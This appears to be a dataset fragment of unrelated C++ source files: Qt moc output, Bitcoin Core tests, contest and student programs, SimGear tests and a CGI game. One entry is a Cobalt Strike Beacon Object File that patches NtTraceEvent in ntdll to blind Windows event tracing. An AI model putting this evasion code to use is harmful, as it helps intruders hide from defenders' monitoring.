project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"search_bloc\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/****************************************************************************\n** Meta object code from reading C++ file 'add_edge.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.7.0)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include \"../../Project/add_edge.h\"\n#include <QtCore/qmetatype.h>\n\n#include <QtCore/qtmochelpers.h>\n\n#include <memory>\n\n\n#include <QtCore/qxptype_traits.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'add_edge.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.7.0. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\n#ifndef Q_CONSTINIT\n#define Q_CONSTINIT\n#endif\n\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\nnamespace {\n\n#ifdef QT_MOC_HAS_STRINGDATA\nstruct qt_meta_stringdata_CLASSAdd_EdgeENDCLASS_t {};\nconstexpr auto qt_meta_stringdata_CLASSAdd_EdgeENDCLASS = QtMocHelpers::stringData(\n    \"Add_Edge\",\n    \"on_AddEdge_clicked\",\n    \"\",\n    \"on_OneMore_clicked\"\n);\n#else  // !QT_MOC_HAS_STRINGDATA\n#error \"qtmochelpers.h not found or too old.\"\n#endif // !QT_MOC_HAS_STRINGDATA\n} // unnamed namespace\n\nQ_CONSTINIT static const uint qt_meta_data_CLASSAdd_EdgeENDCLASS[] = {\n\n // content:\n      12,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       2,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       0,       // signalCount\n\n // slots: name, argc, parameters, tag, flags, initial metatype offsets\n       1,    0,   26,    2, 0x08,    1 /* Private */,\n       3,    0,   27,    2, 0x08,    2 /* Private */,\n\n // slots: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nQ_CONSTINIT const QMetaObject Add_Edge::staticMetaObject = { {\n    QMetaObject::SuperData::link<QWidget::staticMetaObject>(),\n    qt_meta_stringdata_CLASSAdd_EdgeENDCLASS.offsetsAndSizes,\n    qt_meta_data_CLASSAdd_EdgeENDCLASS,\n    qt_static_metacall,\n    nullptr,\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSAdd_EdgeENDCLASS_t,\n        // Q_OBJECT / Q_GADGET\n        QtPrivate::TypeAndForceComplete<Add_Edge, std::true_type>,\n        // method 'on_AddEdge_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'on_OneMore_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>\n    >,\n    nullptr\n} };\n\nvoid Add_Edge::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<Add_Edge *>(_o);\n        (void)_t;\n        switch (_id) {\n        case 0: _t->on_AddEdge_clicked(); break;\n        case 1: _t->on_OneMore_clicked(); break;\n        default: ;\n        }\n    }\n    (void)_a;\n}\n\nconst QMetaObject *Add_Edge::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *Add_Edge::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_CLASSAdd_EdgeENDCLASS.stringdata0))\n        return static_cast<void*>(this);\n    return QWidget::qt_metacast(_clname);\n}\n\nint Add_Edge::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QWidget::qt_metacall(_c, _id, _a);\n    if (_id < 0)\n        return _id;\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        if (_id < 2)\n            qt_static_metacall(this, _c, _id, _a);\n        _id -= 2;\n    } else if (_c == QMetaObject::RegisterMethodArgumentMetaType) {\n        if (_id < 2)\n            *reinterpret_cast<QMetaType *>(_a[0]) = QMetaType();\n        _id -= 2;\n    }\n    return _id;\n}\nQT_WARNING_POP\n",
    "// Copyright (c) 2009-2015 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <qt/test/paymentservertests.h>\n\n#include <qt/optionsmodel.h>\n#include <qt/test/paymentrequestdata.h>\n\n#include <amount.h>\n#include <random.h>\n#include <script/script.h>\n#include <script/standard.h>\n#include <util.h>\n#include <utilstrencodings.h>\n\n#include <openssl/x509.h>\n#include <openssl/x509_vfy.h>\n\n#include <QFileOpenEvent>\n#include <QTemporaryFile>\n\nX509 *parse_b64der_cert(const char* cert_data)\n{\n    std::vector<unsigned char> data = DecodeBase64(cert_data);\n    assert(data.size() > 0);\n    const unsigned char* dptr = data.data();\n    X509 *cert = d2i_X509(nullptr, &dptr, data.size());\n    assert(cert);\n    return cert;\n}\n\n//\n// Test payment request handling\n//\n\nstatic SendCoinsRecipient handleRequest(PaymentServer* server, std::vector<unsigned char>& data)\n{\n    RecipientCatcher sigCatcher;\n    QObject::connect(server, SIGNAL(receivedPaymentRequest(SendCoinsRecipient)),\n        &sigCatcher, SLOT(getRecipient(SendCoinsRecipient)));\n\n    // Write data to a temp file:\n    QTemporaryFile f;\n    f.open();\n    f.write((const char*)data.data(), data.size());\n    f.close();\n\n    // Create a QObject, install event filter from PaymentServer\n    // and send a file open event to the object\n    QObject object;\n    object.installEventFilter(server);\n    QFileOpenEvent event(f.fileName());\n    // If sending the event fails, this will cause sigCatcher to be empty,\n    // which will lead to a test failure anyway.\n    QCoreApplication::sendEvent(&object, &event);\n\n    QObject::disconnect(server, SIGNAL(receivedPaymentRequest(SendCoinsRecipient)),\n        &sigCatcher, SLOT(getRecipient(SendCoinsRecipient)));\n\n    // Return results from sigCatcher\n    return sigCatcher.recipient;\n}\n\nvoid PaymentServerTests::paymentServerTests()\n{\n    SelectParams(CBaseChainParams::MAIN);\n    OptionsModel optionsModel;\n    PaymentServer* server = new PaymentServer(nullptr, false);\n    X509_STORE* caStore = X509_STORE_new();\n    X509_STORE_add_cert(caStore, parse_b64der_cert(caCert1_BASE64));\n    PaymentServer::LoadRootCAs(caStore);\n    server->setOptionsModel(&optionsModel);\n    server->uiReady();\n\n    std::vector<unsigned char> data;\n    SendCoinsRecipient r;\n    QString merchant;\n\n    // Now feed PaymentRequests to server, and observe signals it produces\n\n    // This payment request validates directly against the\n    // caCert1 certificate authority:\n    data = DecodeBase64(paymentrequest1_cert1_BASE64);\n    r = handleRequest(server, data);\n    r.paymentRequest.getMerchant(caStore, merchant);\n    QCOMPARE(merchant, QString(\"testmerchant.org\"));\n\n    // Signed, but expired, merchant cert in the request:\n    data = DecodeBase64(paymentrequest2_cert1_BASE64);\n    r = handleRequest(server, data);\n    r.paymentRequest.getMerchant(caStore, merchant);\n    QCOMPARE(merchant, QString(\"\"));\n\n    // 10-long certificate chain, all intermediates valid:\n    data = DecodeBase64(paymentrequest3_cert1_BASE64);\n    r = handleRequest(server, data);\n    r.paymentRequest.getMerchant(caStore, merchant);\n    QCOMPARE(merchant, QString(\"testmerchant8.org\"));\n\n    // Long certificate chain, with an expired certificate in the middle:\n    data = DecodeBase64(paymentrequest4_cert1_BASE64);\n    r = handleRequest(server, data);\n    r.paymentRequest.getMerchant(caStore, merchant);\n    QCOMPARE(merchant, QString(\"\"));\n\n    // Validly signed, but by a CA not in our root CA list:\n    data = DecodeBase64(paymentrequest5_cert1_BASE64);\n    r = handleRequest(server, data);\n    r.paymentRequest.getMerchant(caStore, merchant);\n    QCOMPARE(merchant, QString(\"\"));\n\n    // Try again with no root CA's, verifiedMerchant should be empty:\n    caStore = X509_STORE_new();\n    PaymentServer::LoadRootCAs(caStore);\n    data = DecodeBase64(paymentrequest1_cert1_BASE64);\n    r = handleRequest(server, data);\n    r.paymentRequest.getMerchant(caStore, merchant);\n    QCOMPARE(merchant, QString(\"\"));\n\n    // Load second root certificate\n    caStore = X509_STORE_new();\n    X509_STORE_add_cert(caStore, parse_b64der_cert(caCert2_BASE64));\n    PaymentServer::LoadRootCAs(caStore);\n\n    QByteArray byteArray;\n\n    // For the tests below we just need the payment request data from\n    // paymentrequestdata.h parsed + stored in r.paymentRequest.\n    //\n    // These tests require us to bypass the following normal client execution flow\n    // shown below to be able to explicitly just trigger a certain condition!\n    //\n    // handleRequest()\n    // -> PaymentServer::eventFilter()\n    //   -> PaymentServer::handleURIOrFile()\n    //     -> PaymentServer::readPaymentRequestFromFile()\n    //       -> PaymentServer::processPaymentRequest()\n\n    // Contains a testnet paytoaddress, so payment request network doesn't match client network:\n    data = DecodeBase64(paymentrequest1_cert2_BASE64);\n    byteArray = QB",
    "// https://dmoj.uclv.edu.cu/problem/secnum\n\n#include <bits/stdc++.h>\n\nusing namespace std;\n\ntypedef long long ll;\nconst ll mod = 100000007;\n\nstruct matrix{\n    ll mat[2][2];\n    matrix friend operator *(const matrix &a, const matrix &b){\n        matrix c;\n        for(int i = 0; i < 2; i++)\n        for(int j = 0; j < 2; j++){\n            c.mat[i][j] = 0;\n            for(int k = 0; k < 2; k++){\n                c.mat[i][j] += (a.mat[i][k]*b.mat[k][j])%mod;\n                c.mat[i][j] %= mod;\n            }\n        }\n        return c;\n    }\n};\n\nmatrix matpow(matrix base, ll n){\n    matrix ans;\n    for(int i = 0; i < 2; i++)\n        for(int j = 0; j < 2; j++)\n            ans.mat[i][j] = (i==j);\n    while(n){\n        if(n&1)\n            ans = ans*base;\n        base = base*base;\n        n >>= 1;\n    }\n    return ans;\n}\n\nint main(){\n    ios_base::sync_with_stdio(0); cin.tie(0);\n\n    int t;\n    cin >> t;\n    ll n;\n    matrix base, ans;\n    base.mat[0][0] = base.mat[0][1] = base.mat[1][0] = 1;\n    base.mat[1][1] = 0;\n    while(t--){\n        cin >> n;\n        ans = matpow(base,n);\n        cout << ans.mat[0][0] << ' ';\n    }\n\n}",
    "#include <iostream>\n#include \"header/astronauta.hpp\"\n#include \"header/voo.hpp\"\n#include \"header/funcoesMenu.hpp\"\n#include \"header/gerenciamentoVoo.hpp\"\n\nusing namespace std;\n\nint main() {\n    GerenciamentoVoo gerenciamentoVoo;\n    list<Astronauta> astronautas;\n    list<Voo> voos;\n    multimap<int, Astronauta> passageiros;\n    setlocale(LC_ALL, \"pt_BR\");\n\n    int choice;\n\n    do {\n        cout << \"\\n=== Menu ===\\n\";  \n        cout << \"1 - Cadastrar astronauta\\n\";\n        cout << \"2 - Cadastrar voo\\n\";\n        cout << \"3 - Adicionar astronauta em voo\\n\";\n        cout << \"4 - Remover astronauta de um voo\\n\";\n        cout << \"5 - Lan\u00e7ar um voo\\n\";\n        cout << \"6 - Explodir voo\\n\";\n        cout << \"7 - Finalizar voo\\n\";\n        cout << \"8 - Listar todos os voos\\n\";\n        cout << \"9 - Listar todos os astronautas mortos\\n\";\n        cout << \"0 - Sair\\n\";\n\n        cout << \"Escolha uma opcao: \"; \n        cin >> choice;\n\n        switch (choice) {\n            case 1:\n                cadastrarAstronautas(astronautas);\n                break;\n            case 2:\n                cadastrarVoos(voos);\n                break;\n            case 3:\n                adicionarAtronautaVoo(voos, astronautas, passageiros, gerenciamentoVoo);\n                break;\n            case 4:\n                removerAstronautaVoo(voos, astronautas, passageiros, gerenciamentoVoo);\n                break;\n            case 5:\n                lancarVoo(voos, astronautas, passageiros, gerenciamentoVoo);\n                break;\n            case 6:\n                explodirVoo(voos, astronautas, passageiros, gerenciamentoVoo);\n                break;\n            case 7:\n                finalizarVoo(voos, astronautas, passageiros, gerenciamentoVoo);\n                break;\n            case 8:\n                listarVoo(voos, passageiros);\n                break;\n            case 9:\n                listarAstronautasMortos(astronautas);\n                break;\n            case 0:\n                printf(\"Saindo...\\n\");\n                break;\n            default:\n                printf(\"Op\u00e7\u00e3o inv\u00e1lida. Tente novamente.\\n\");\n        }\n\n    } while (choice != 0);\n\n    return 0;\n}",
    "#include <Windows.h>\n#include \"base\\helpers.h\"\n\n/**\n * For the debug build we want:\n *   a) Include the mock-up layer\n *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API\n *      is linked against the the debug build.\n */\n#ifdef _DEBUG\n#include \"base\\mock.h\"\n#undef DECLSPEC_IMPORT\n#define DECLSPEC_IMPORT\n#endif\n\nextern \"C\" {\n#include \"beacon.h\"\n    // Define the Dynamic Function Resolution declaration for the GetLastError function\n    DFR(KERNEL32, GetLastError);\n    DFR(KERNEL32, GetProcAddress);\n    DFR(KERNEL32, GetModuleHandleA);\n    DFR(NTDLL, NtProtectVirtualMemory);\n    DFR(NTDLL, NtWriteVirtualMemory);\n    // Map GetLastError to KERNEL32$GetLastError \n#define GetLastError KERNEL32$GetLastError \n#define GetProcAddress KERNEL32$GetProcAddress\n#define GetModuleHandleA KERNEL32$GetModuleHandleA\n#define NtProtectVirtualMemory NTDLL$NtProtectVirtualMemory\n#define NtWriteVirtualMemory NTDLL$NtWriteVirtualMemory\n\n    void go(char* args, int len) {\n\n        HANDLE hProc = 0;\n        NTSTATUS success;\n\n        DWORD oldPro = 0;\n        LPVOID ptrNtTraceEvent = NULL;\n        HMODULE ntdll = NULL;\n        HANDLE hCurProc = (HANDLE)0xffffffffffffffff;\n        unsigned char patch[] = { '\\xc3' };\n        SIZE_T sizeOfPatch = sizeof(patch);\n        char* ntTraceEvent = \"NtTraceEvent\";\n        char* masterDLL = \"ntdll.dll\";\n\n        formatp buffer;\n        BeaconFormatAlloc(&buffer, 2048);\n\n        ntdll = GetModuleHandleA((LPCSTR)masterDLL);\n        //ntdll = GetModuleHandleA((LPCSTR)masterDLL);\n        if (ntdll != 0) BeaconFormatPrintf(&buffer, \"[+] Handle to NTDLL obtained.\\n\");\n        \n\n\n        ptrNtTraceEvent = GetProcAddress(ntdll, ntTraceEvent);\n        if (ptrNtTraceEvent != NULL) BeaconFormatPrintf(&buffer, \"[+] Pointer to NtTraceEvent obtained.\\n\");\n        char* value = (char*)ptrNtTraceEvent;\n\n        BeaconFormatPrintf(&buffer, \"[+] NtTraceEvent 3rd byte before patching: %x\\n\", *(value + 3));\n\n        success = NtProtectVirtualMemory(hCurProc, &ptrNtTraceEvent, (PULONG)&sizeOfPatch, PAGE_EXECUTE_WRITECOPY, &oldPro);\n        if (success == 0) BeaconFormatPrintf(&buffer, \"[+] Protection of NtTraceEvent changed to wcx.\\n\");\n\n        success = NtWriteVirtualMemory(hCurProc, value + 3, (PVOID)patch, 1, (SIZE_T*)NULL);\n        if (success == 0) BeaconFormatPrintf(&buffer, \"[+] RET instruction copied successfully.\\n\");\n\n        BeaconFormatPrintf(&buffer, \"[+] NtTraceEvent 3rd byte after patching: %x\\n\", *(value + 3));\n\n        success = NtProtectVirtualMemory(hCurProc, &ptrNtTraceEvent, (PULONG)&sizeOfPatch, oldPro, &oldPro);\n        if (success == 0) BeaconFormatPrintf(&buffer, \"[+] Protection of NtTraceEvent restored\");\n\n        BeaconPrintf(CALLBACK_OUTPUT, \"%s\\n\", BeaconFormatToString(&buffer, NULL));\n        BeaconFormatFree(&buffer);\n    }\n}\n\n// Define a main function for the bebug build\n#if defined(_DEBUG) && !defined(_GTEST)\n\nint main(int argc, char* argv[]) {\n    // Run BOF's entrypoint\n    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, \"foobar\");\n    bof::runMocked<>(go);\n    return 0;\n}\n\n// Define unit tests\n#elif defined(_GTEST)\n#include <gtest\\gtest.h>\n\nTEST(BofTest, Test1) {\n    std::vector<bof::output::OutputEntry> got =\n        bof::runMocked<>(go);\n    std::vector<bof::output::OutputEntry> expected = {\n        {CALLBACK_OUTPUT, \"System Directory: C:\\\\Windows\\\\system32\"}\n    };\n    // It is possible to compare the OutputEntry vectors, like directly\n    // ASSERT_EQ(expected, got);\n    // However, in this case, we want to compare the output, ignoring the case.\n    ASSERT_EQ(expected.size(), got.size());\n    ASSERT_STRCASEEQ(expected[0].output.c_str(), got[0].output.c_str());\n}\n#endif",
    "#include <iostream>\n\nusing namespace std;\n\nconst int righeMax=3;\nconst int colonneMax=3;\n\n//prototipi\nvoid caricaMatrice(int matrix[righeMax][colonneMax]);\nvoid visualizzaMatrice(int matrix[righeMax][colonneMax]);\nvoid caricaVettori(int matrix[righeMax][colonneMax], int vr[righeMax*colonneMax], int vc[righeMax*colonneMax]);\nvoid visualizzaVettori(int vr[], int vc[]);\nint Menu();\n\nint main() {\n\n  int scelta;\n  int matrix[righeMax][colonneMax];\n  int VR[righeMax*colonneMax];\n  int VC[righeMax*colonneMax];\n  \n  do {\n    scelta=Menu();\n    switch(scelta) {\n      case 1:\n        caricaMatrice(matrix);\n      break;\n      case 2:\n        visualizzaMatrice(matrix);\n      break;\n      case 3:\n        caricaVettori(matrix,VR,VC);\n      break;\n      case 4:\n        visualizzaVettori(VR,VC);\n      break;\n      case 0:\n        cout<<\"Esci\"<<endl;\n      break;\n      default:\n        cout<<\"Attenzione, scelta sbagliata!\"<<endl;\n      break;\n    }\n  }while(scelta!=0);\n  \n}\n\n\nint Menu() {\n  int scegli;\n  cout<<\"-----------------MENU-----------------\"<<endl;\n  cout<<\"1-Carica matrice\"<<endl;\n  cout<<\"2-Visualizza matrice\"<<endl;\n  cout<<\"3-Carica vettori righe e colonne\"<<endl;\n  cout<<\"4-Stampa i vettori\"<<endl;\n  cout<<\"0-Fine\"<<endl;\n  cout<<\"Scegli un operazione: \"<<endl;\n  cin>>scegli;\n\n  return scegli;\n}\n\n\nvoid caricaMatrice(int matrix[righeMax][colonneMax]) {\n\n  cout<<endl;\n\n  for(int i=0; i<righeMax; i++) {\n    for(int j=0; j<colonneMax; j++) {\n      cout<<\"Inserisci il valore della cella \"<<i+1<<\" \"<<j+1<<\": \";\n      cin>>matrix[i][j];\n    }\n  }\n\n\n  cout<<endl;\n\n}\n\nvoid visualizzaMatrice(int matrix[righeMax][colonneMax]) {\n\n  cout<<endl;\n\n  for(int i=0; i<righeMax; i++) {\n    for(int j=0; j<colonneMax; j++) {\n      cout<<matrix[i][j]<<\"\\t\";\n    }\n    cout<<endl;\n  }\n\n  cout<<endl;\n\n}\n\n\nvoid caricaVettori(int matrix[righeMax][colonneMax], int vr[], int vc[]) {\n  \n  for(int i=0; i<righeMax; i++) {\n    for(int j=0; j<colonneMax; j++) {\n      vr[i*colonneMax+j]=matrix[i][j];\n    }\n  }\n\n\n  for(int i=0; i<righeMax; i++) {\n    for(int j=0; j<colonneMax; j++) {\n      vc[i*colonneMax+j]=matrix[j][i];\n    }\n  }\n\n  \n}\n\n\nvoid visualizzaVettori(int vr[], int vc[]) {\n  cout<<endl;\n\n  cout<<endl;\n\n  cout<<\"---------------VETTORE RIGHE---------------\"<<endl;\n\n  for(int i=0; i<righeMax*colonneMax; i++) {\n     cout<<vr[i]<<endl;\n  }\n\n  cout<<endl;\n\n  cout<<\"---------------VETTORE COLONNE---------------\"<<endl;\n\n  for(int i=0; i<righeMax*colonneMax; i++) {\n    cout<<vc[i]<<endl;\n  }\n  \n}\n",
    "// -*- coding: utf-8 -*-\n//\n// Unit tests for reference counting and smart pointer classes\n\n#include <iostream>\n#include <utility>\n\n#include <cstdlib>              // EXIT_SUCCESS\n\n#include <simgear/misc/test_macros.hxx>\n\n#include \"SGSharedPtr.hxx\"\n#include \"SGWeakPtr.hxx\"\n\nstatic int instance_count = 0;\nstruct ReferenceCounted:\n  public SGReferenced\n{\n  ReferenceCounted()\n  {\n    ++instance_count;\n  }\n\n  ~ReferenceCounted()\n  {\n    --instance_count;\n  }\n};\ntypedef SGSharedPtr<ReferenceCounted> RefPtr;\n\nvoid test_SGSharedPtr()\n{\n  std::cout << \"Testing SGSharedPtr and SGReferenced\" << std::endl;\n\n  SG_CHECK_EQUAL( ReferenceCounted::count(0), 0 );\n\n  RefPtr ptr( new ReferenceCounted() );\n  SG_CHECK_EQUAL( instance_count, 1 );\n  SG_CHECK_EQUAL( ReferenceCounted::count(ptr.get()), 1 );\n  SG_CHECK_EQUAL( ptr.getNumRefs(), 1 );\n\n  // Test SGSharedPtr's copy assignment operator\n  RefPtr ptr2 = ptr;\n  SG_CHECK_EQUAL( ptr.getNumRefs(), 2 );\n  SG_CHECK_EQUAL( ptr2.getNumRefs(), 2 );\n\n  SG_CHECK_EQUAL( ptr, ptr2 );\n  SG_CHECK_EQUAL( ptr.get(), ptr2.get() );\n\n  // Test SGSharedPtr::reset() with no argument\n  ptr.reset();\n  SG_CHECK_IS_NULL( ptr.get() );\n  SG_CHECK_EQUAL( ptr.getNumRefs(), 0 );\n  SG_CHECK_EQUAL( ReferenceCounted::count(ptr2.get()), 1 );\n  SG_CHECK_EQUAL( ptr2.getNumRefs(), 1 );\n\n  ptr2.reset();\n  SG_CHECK_IS_NULL( ptr2.get() );\n  SG_CHECK_EQUAL( ptr.getNumRefs(), 0 );\n  SG_CHECK_EQUAL( ptr2.getNumRefs(), 0 );\n  SG_CHECK_EQUAL( instance_count, 0) ;\n\n  // Test operator==() and operator!=() for SGSharedPtr\n  {\n    RefPtr ptrA(new ReferenceCounted());\n    RefPtr ptrB(ptrA);\n    RefPtr ptrC(new ReferenceCounted());\n    RefPtr emptyPtr{};\n    SG_CHECK_EQUAL( ptrA, ptrB );\n    SG_CHECK_EQUAL( ptrA.get(), ptrB.get() ); // same thing by definition\n    SG_CHECK_NE( ptrA, ptrC );\n    SG_CHECK_NE( ptrA.get(), ptrC.get() );\n    SG_CHECK_NE( ptrB, ptrC );\n    SG_CHECK_NE( ptrA, emptyPtr );\n    SG_CHECK_EQUAL( emptyPtr, emptyPtr );\n  }\n\n  // Test SGSharedPtr::reset(T* p) and SGSharedPtr::operator T*()\n  {\n    RefPtr ptrA(new ReferenceCounted());\n    SG_CHECK_EQUAL( ptrA.getNumRefs(), 1 );\n\n    RefPtr ptrB(new ReferenceCounted());\n    SG_CHECK_NE( ptrA, ptrB );\n    ptrB.reset(ptrA);\n    SG_CHECK_EQUAL( ptrA, ptrB );\n    SG_CHECK_EQUAL( ptrA.getNumRefs(), 2 );\n    SG_CHECK_EQUAL( ptrB.getNumRefs(), 2 );\n\n    RefPtr ptrC(new ReferenceCounted());\n    SG_CHECK_NE( ptrA, ptrC );\n    SG_CHECK_EQUAL( ptrC.getNumRefs(), 1 );\n    // ptrA is implicit converted to ReferenceCounted*\n    ptrC.reset(ptrA);\n    SG_CHECK_EQUAL( ptrA.getNumRefs(), 3 );\n    SG_CHECK_EQUAL( ptrB.getNumRefs(), 3 );\n    SG_CHECK_EQUAL( ptrC.getNumRefs(), 3 );\n    SG_CHECK_EQUAL( ptrA, ptrB );\n    SG_CHECK_EQUAL( ptrB, ptrC );\n  }\n\n  // Test SGSharedPtr's copy constructor\n  {\n    RefPtr ptrA(new ReferenceCounted());\n    SG_CHECK_EQUAL( ptrA.getNumRefs(), 1 );\n\n    RefPtr ptrB(ptrA);\n    SG_CHECK_EQUAL( ptrA.getNumRefs(), 2 );\n    SG_CHECK_EQUAL( ptrB.getNumRefs(), 2 );\n    SG_CHECK_EQUAL( ptrA, ptrB );\n  }\n\n  // Test SGSharedPtr's move constructor\n  {\n    RefPtr ptrA(new ReferenceCounted());\n    RefPtr ptrB(ptrA);\n    RefPtr ptrC(std::move(ptrA));\n\n    SG_CHECK_EQUAL( ptrB.getNumRefs(), 2 );\n    SG_CHECK_EQUAL( ptrC.getNumRefs(), 2 );\n    SG_CHECK_EQUAL( ptrB, ptrC );\n    // Although our implementation has these two properties, they are\n    // absolutely *not* guaranteed by the C++ move semantics:\n    SG_CHECK_EQUAL( ptrA.getNumRefs(), 0 );\n    SG_CHECK_IS_NULL( ptrA.get() );\n  }\n\n  // Test SGSharedPtr's move assignment operator: self-move, supposedly\n  // undefined behavior but certainly safer as a no-op---which the\n  // copy-and-swap idiom offers for free.\n  {\n    RefPtr ptrA(new ReferenceCounted());\n    RefPtr ptrB(ptrA);\n\n    ptrA = std::move(ptrA);\n    SG_CHECK_EQUAL( ptrA.getNumRefs(), 2 );\n    SG_CHECK_EQUAL( ptrB.getNumRefs(), 2 );\n    SG_CHECK_IS_NOT_NULL( ptrA.get() );\n    SG_CHECK_EQUAL( ptrA, ptrB );\n  }\n\n  // Test SGSharedPtr's move assignment operator: move to an empty SGSharedPtr\n  {\n    RefPtr ptrA;\n    RefPtr ptrB(new ReferenceCounted());\n\n    ptrA = std::move(ptrB);\n    SG_CHECK_EQUAL( ptrA.getNumRefs(), 1 );\n    SG_CHECK_IS_NOT_NULL( ptrA.get() );\n    // Implementation detail that is *not* guaranteed by the C++ move\n    // semantics:\n    SG_CHECK_EQUAL( ptrB.getNumRefs(), 0 );\n    SG_CHECK_IS_NULL( ptrB.get() );\n  }\n\n  // Test SGSharedPtr's move assignment operator: move to a non-empty\n  // SGSharedPtr\n  {\n    RefPtr ptrA(new ReferenceCounted());\n    RefPtr ptrB(ptrA);\n    RefPtr ptrC(new ReferenceCounted());\n\n    SG_CHECK_EQUAL( ptrA.getNumRefs(), 2 );\n    SG_CHECK_EQUAL( ptrB.getNumRefs(), 2 );\n    SG_CHECK_EQUAL( ptrC.getNumRefs(), 1 );\n    SG_CHECK_EQUAL( ptrA, ptrB );\n    SG_CHECK_NE( ptrA, ptrC );\n\n    ptrA = std::move(ptrC);\n    SG_CHECK_EQUAL( ptrA.getNumRefs(), 1 );\n    SG_CHECK_EQUAL( ptrB.getNumRefs(), 1 );\n    SG_CHECK_NE( ptrA, ptrB );\n    // Implementation detail that is *not* guaranteed by the C++ move\n    // semantics:\n  ",
    "#include <iostream>\n#include <dirent.h>\n#include <string>\n#include <iomanip>\n#include <sys/stat.h>\n\nusing namespace std;\n\nint main() {\nstring directory_path;\n\nwhile (true) {\n    cout << \":\";\n    getline(cin, directory_path);\n\n    DIR* dir = opendir(directory_path.c_str());\n    if (dir == NULL) {\n        cerr << \"Error: Unable to open directory.\" << endl;\n        continue;}\n\n    struct dirent* entry;\n    while ((entry = readdir(dir)) != NULL) {\n        string file_name(entry->d_name);        \n        if (file_name == \".\" || file_name == \"..\") \n            continue;\n        string full_path = directory_path + \"/\" + file_name;\n\n        struct stat file_stat;\n        stat(full_path.c_str(), &file_stat);\n\n        if (S_ISDIR(file_stat.st_mode)) // if folder:\n            cout << std::setw(15) <<  file_name << \"/\" << endl; \n        else {                          // if file:\n            // Round up to nearest 4KB block\n            long file_size_kb = (file_stat.st_size + 4095) / 1024; \n\n            cout << std::setw(16) << file_name.substr(0, 16)\n                << \" | \" << file_size_kb << \" KB\" << endl;\n        }\n    }\n    closedir(dir);\n}\nreturn 0;\n}\n",
    "#include \"get_validate_inputs.h\"\r\n#include \"functions.h\"\r\n#include \"Object.h\"\r\n#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <errno.h>\r\n#include <utility>\r\n#include <sstream>\r\n#include <cstdlib>\r\n#include <cstring>\r\n\r\n#include <cgicc/CgiDefs.h>\r\n#include <cgicc/Cgicc.h>\r\n#include <cgicc/FormEntry.h>\r\n#include <cgicc/HTTPHTMLHeader.h>\r\n#include <cgicc/HTMLClasses.h>\r\n\r\nusing namespace std;\r\nusing namespace cgicc;\r\n\r\nvoid processInputs(const string& game, const string& option, const Cgicc& cgi){\r\n    if (game == \"count\") {\r\n        cout << \"You selected the Counter game.\" << endl;\r\n        if (option == \"rows\") {\r\n            cout << \"You started a randomized game.\" << endl;\r\n            //Get text from textbox\r\n            string input = cgi(\"charinput\");\r\n            string rows = cgi(\"rows\");\r\n            string intinput = cgi(\"intinput\");\r\n            int guess = s_to_int(intinput);\r\n            int numrows;\r\n            int numcols;\r\n\r\n            if (isNumber(input)) {\r\n                cout << \"<br>\";\r\n                cout << \"<font color='red'>Please only enter letters...</font>\" << endl;\r\n            } else {\r\n                if(rows == \"\"){\r\n                    cout << \"<font color='red'>You forgot to select the number of rows...</font>\" << \"<br>\" << endl;\r\n                }else{\r\n                    if (is_notdigit(rows)) {\r\n                        cout << \"<font color='blue'><b>\" << rows << \"</b></font> <font color='red'>Please enter a number...</font>\" << \"<br>\" << endl;\r\n                    } else {\r\n                        numrows = s_to_int(rows);\r\n                    }\r\n                }\r\n\r\n                string cols = cgi(\"cols\");\r\n                if(cols == \"\"){\r\n                    cout << \"<font color='red'>You forgot to select the number of columns...</font>\" << \"<br>\" << endl;\r\n                }else{\r\n                    if (is_notdigit(cols)) {\r\n                        cout << \"<font color='blue'><b>\" << cols << \"</b></font> <font color='red'>Please enter a number...</font>\" << \"<br>\" << endl;\r\n                    } else {\r\n                        numcols = s_to_int(cols);\r\n                    }\r\n                }\r\n\r\n                Object p1;\r\n                char counter;\r\n                srand(time(0));\r\n                vector<vector<char> > mdarray(numrows, vector<char>(numcols));\r\n                for(int i = 0; i < numrows; i++){\r\n                    for(int j = 0; j < numcols; j++){\r\n                        \r\n                        mdarray[i][j] = rand() % ('z' - 'a' + 1) + 'a';\r\n                    }\r\n                }\r\n                \r\n                //Display dimensions and grid\r\n                cout << \"<br>\";\r\n                cout << \"Height: \" << numrows << \", Width: \" << 